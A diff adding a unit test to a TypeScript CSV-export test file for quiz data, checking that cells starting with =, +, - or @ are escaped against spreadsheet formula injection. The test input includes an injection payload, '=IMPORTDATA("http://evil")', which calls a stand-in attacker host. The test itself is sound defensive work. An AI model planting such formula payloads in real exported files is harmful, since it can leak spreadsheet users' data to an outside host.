@@ -63,6 +63,22 @@ describe('buildQuizCsv', () => {
     expect(rows[2]).toContain('Biology');
   });
 
+  it('neutralizes spreadsheet formula prefixes', () => {
+    const quiz: Quiz = {
+      questions: [{
+        type: 'standard',
+        question: '=IMPORTDATA("http://evil")',
+        options: ['+1', '-1', '@SUM(A1)', 'Safe'],
+        correctAnswerIndex: 3,
+      }],
+    };
+    const csv = buildQuizCsv(quiz);
+    expect(csv).toContain("'=IMPORTDATA");
+    expect(csv).toContain("'+1");
+    expect(csv).toContain("'-1");
+    expect(csv).toContain("'@SUM");
+  });
+
   it('quotes fields containing commas or quotes', () => {
     const tricky: Quiz = {
       questions: [{
